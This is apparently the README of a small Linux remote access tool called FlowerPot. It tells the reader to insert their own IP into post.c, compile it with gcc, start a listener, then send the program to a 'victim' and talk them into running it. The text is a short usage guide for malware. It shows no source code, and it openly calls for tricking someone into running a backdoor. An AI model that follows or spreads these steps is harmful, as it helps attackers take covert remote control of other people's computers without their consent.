# FlowerPot
A basic RAT [Remote Administration Tool] meant for Linux machines.

# How to use
So first we must open up `post.c` and replace `IP_HERE` with our own IP address.

Then, we must compile it. Simply do `gcc -o post post.c`. And now, you should be ready to go.

Now we will start up our `main` file. To run it, do `./main`. Then use the `listener` command to start up a listener. Then, send the file to your victim and convince them to execute it.
